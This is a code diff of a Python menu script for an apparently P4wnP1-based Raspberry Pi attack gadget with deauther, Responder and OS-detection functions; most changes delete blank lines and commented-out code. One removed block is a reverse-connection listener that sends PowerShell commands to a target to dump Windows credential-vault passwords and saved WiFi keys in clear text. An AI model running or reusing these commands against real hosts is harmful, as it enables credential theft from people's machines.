@@ -5,14 +5,9 @@ import os
 import time
 import subprocess
 from subprocess import Popen
-
 import RPi.GPIO as GPIO
 import smbus2 as smbus
-
 from luma.core.render import canvas
-
-# from luma.core.sprite_system import framerate_regulator
-#from luma.oled.device import sh1106
 from PIL import ImageFont
 from library import display, ups, system, ui
 
@@ -44,26 +39,6 @@ KEY1_PIN = 21  # key 1 // up
 KEY2_PIN = 20  # 20 #key 2 // cancel/goback
 KEY3_PIN = 16  # key 3 // down
 USER_I2C = 0  # set to 1 if your oled is I2C or  0 if use SPI interface
-
-
-# def system.execCmd(cmd: str, skipError=False):
-#     result = None
-#     try:
-#         result = str(subprocess.check_output(cmd, shell=True))
-#     except subprocess.CalledProcessError:
-#         result = -1
-
-#     # if we failed to run the command
-#     if result == -1 and skipError is not True:
-#         display.errorNew("error when running", cmd)
-#         time.sleep(3)
-#         return ()
-#     return result
-
-
-
-
-
 
 # todo: replace with tmuxRun
 
@@ -127,10 +102,6 @@ def autoKillCommandNoKill(tx1, t):
     )
     result = system.execCmd(cmd)
     Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
-    # display.text("","","Executed","","","","")
-    # print(cmd)
-    # subprocess.call(["timeout 2s",str(cmd)])
-    ##Popen(['timeout',cmd],preexec_fn=os.setpgrp)
     cmd = "rm -f nohup.out && rm -f touchedcommand.sh"
     result = system.execCmd(cmd)
     if result == -1:
@@ -201,13 +172,8 @@ def checklist(_list):
         time.sleep(0.1)
     return ""
 
-
-
-
-
 def shell(cmd):
     return subprocess.check_output(cmd, shell=True)
-
 
 def switchMenu(argument):
     switcher = {
@@ -320,9 +286,6 @@ def about():
         pass
 
 
-
-
-
 def identifyOS(ips):
     # return os name if found ex. Microsoft Windows 7 ,  Linux 3.X
     return shell(
@@ -407,8 +370,6 @@ def keyTest():
                     draw.ellipse(
                         (70, 40, 90, 60), outline=255, fill=1
                     )  # A button filled
-
-
 
 
 def templateSelect(list):
@@ -568,16 +529,6 @@ def getTemplateList(type):
 def applyTemplate(template, section):
     print(template)
     print(section)
-    # display.text(
-    #     "THERE IS A BUG",
-    #     "u need to",
-    #     "do this 2 times",
-    #     file,
-    #     "bug of P4wnp1",
-    #     "not mine",
-    #     "               ",
-    # )
-    # time.sleep(3)
     while GPIO.input(KEY_LEFT_PIN):
         answer = 0
         while answer == 0:
@@ -837,20 +788,6 @@ def setTypingSpeed():
             return ()
     time.sleep(0.5)  # pause
 
-
-# def listwifi():
-#     cmd = subprocess.check_output("sudo iwlist wlan0 scan", shell=True)
-#     return cmd
-
-
-# def lwifiExt(word, list):
-#     for n in range(len(list)):
-#         if list[n].find(word) != -1:
-#             rep = list[n].split(":")
-#             return rep[1]
-#     return 0
-
-
 def scanwifi():
     # list wifi APs
     cmd = "sudo iwlist wlan0 scan | grep ESSID"
@@ -1018,126 +955,6 @@ def usbEthOsDetection():
             "",
             "Press LEFT to exit",
         )
-
-
-# def socketCreate():
-#     try:
-#         global host
-#         global port
-#         global s
-#         port = 4445
-#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#         host = ""
-#         if port == "":
-#             socketCreate()
-#         # socketCreate()
-#     except socket.error as msg:
-#         print("socket creation error: " + str(msg[0]))
-
-
-# def socketBind():
-#     try:
-#         print("Binding socket at port %s" % (port))
-#         s.bind((host, port))
-#         s.listn(1)
-#     except socket.error as msg:
-#         print("socket bindig error: " + str(msg[0]))
-#         print("Retring...")
-#         socketBind()
-
-
-# def socketAccept():
-#     global conn
-#     global addr
-#     global hostname
-#     try:
-#         conn, addr = s.accept()
-#         print("[!] Session opened at %s:%s" % (addr[0], addr[1]))
-#         menu2()
-#     except socket.error as msg:
-#         print("Socket Accepting error: " + str(msg[0]))
-
-
-# def sendps1(ps1file):
-#     f = open(ps1file, "r")
-#     for x in f:
-#         conn.send(x.encode())
-#         result = conn.recv(16834)
-#         print(result.decode())
-
-
-# def menu2():
-#     display.text("", "", "", "      PLEASE WAIT", "", "", "")
-#     shell("P4wnP1_cli hid job 'GetChrome.js'")
-#     hack = ""
-#     command = 'Test-Connection -computer "google.com" -count 1 -quiet'
-#     conn.send(command.encode())
-#     result = conn.recv(16834)
-#     if result.decode()[:-6] == "T":
-#         print("Internet is on, on host")
-#     conn.send("hostname".encode())
-#     result = conn.recv(16834)
-#     print(result.decode().replace("\r\n", "")[:-1])
-#     hostname = result.decode().replace("\r\n", "")[:-1]
-#     command = '[System.IO.DriveInfo]::getdrives() |where-object {$_.VolumeLabel -match "USBKEY"}|sort {$_.name} |foreach-object {; echo "$(echo $_.name)";}'
-#     conn.send(command.encode())
-#     result = conn.recv(16834)
-#     usbkey = result.decode().replace("\r\n", "")[:-1]
-#     print("Usb key detected in : [" + usbkey + "]")
-#     hack = hostname + "\n"
-#     hack = hack + "Passwords windows :\n"
-#     command = "$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$VaultObj = new-object Windows.Security.Credentials.PasswordVault;"
-#     conn.send(command.encode())
-#     result = conn.recv(16834)
-#     print(result.decode())
-#     command = "$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }"
-#     conn.send(command.encode())
-#     result = conn.recv(16834)
-#     hack = hack + result.decode()
-#     print(result.decode())
-#     display.text("", "", "GETTING MS EXPLORER", "      PASSWORDS", "", "", "")
-#     command = '$SSID=((netsh wlan show profiles) -match \'Profil Tous les utilisateurs[^:]+:.(.+)$\').replace("Profil Tous les utilisateurs","").replace(":","").replace(" ","").split("\\n");$fin="";'
-#     conn.send(command.encode())
-#     result = conn.recv(16834)
-#     print(result.decode())
-#     command = "for ($n=0;$n -le $SSID.count-1;$n++){try {;$fin = $fin + $SSID[$n]+((netsh wlan show profiles $SSID[$n].Substring($SSID[$n].Length -($SSID[$n].Length -1)) key=clear) -match 'Contenu de la c[^:]+:.(.+)$').split(\":\")[1];} catch {};};$fin"
-#     conn.send(command.encode())
-#     time.sleep(2)
-#     result = conn.recv(16834)
-#     print(result.decode())
-#     hack = hack + "Wifi : \n" + result.decode()
-#     display.text("", "", "GET STORED WIFI SSID", "      PASSWORDS", "", "", "")
-#     time.sleep(2)
-#     display.text("", "", "GET GOOGLE CHROME", "      PASSWORDS", "", "", "")
-#     time.sleep(2)
-#     print("end")
-#     # done , let save this on disk
-#     f = open("/root/" + hostname + ".txt", "w+")
-#     f.write(hack)
-#     f.close()
-#     print(hostname + ".txt saved, host is pwned")
-#     while 1:
-#         # cmd = raw_input('PS >')
-#         cmd = "quit"
-#         if cmd == "quit":
-#             conn.close()
-#             s.close()
-#             while GPIO.input(KEY_LEFT_PIN):
-#                 display.text(
-#                     "DONE HOST PWNED FIND",
-#                     "ALL INFOS IN FILE",
-#                     "/root/" + hostname + ".txt",
-#                     "CHOME CREDS are in",
-#                     usbkey + hostname + "chrome.txt",
-#                     "",
-#                     "Press LEFT to Exit",
-#                 )
-#             return
-#             # sys.exit()
-#         command = conn.send(cmd)
-#         result = conn.recv(16834)
-#         print(result)
-
 
 def hostSelect():
     display.text("", "", "", "wait, may take a while ", "", "", "")
@@ -1538,11 +1355,6 @@ def deauther():
     system.execCmd(cmd)
     return ()
 
-
-# def selectFromCat(cmd, outputFile):
-#     return ()
-
-
 def deautherClient():
     ###select the AP
     display.msg("Select the AP", 3)
@@ -1797,8 +1609,6 @@ def killResponder():
         display.msg("killing " + str(pid), 0.3)
         system.execCmd("kill -9 " + str(pid))
 
-
-
 def selectNetworkInterface():
     # Get list of network interfaces
     interfaces = subprocess.check_output(['ls', '/sys/class/net']).decode().split()
@@ -1810,7 +1620,6 @@ def selectNetworkInterface():
     #print(interfaces[index])
     if index is not None:
         return interfaces[index]
-
 
 def menuSystemSettings():
     time.sleep(0.1)
@@ -1879,15 +1688,6 @@ def menuHome():
     print("Home Menu")
     while True:
         ui.functionalMenu(menu_home)
-
-
-
-
-# def main():
-#     print("main")
-#     socketCreate()
-#     socketBind()
-#     socketAccept()
 
 def backgroundRescueReboot(channel):
     global buttonStatus
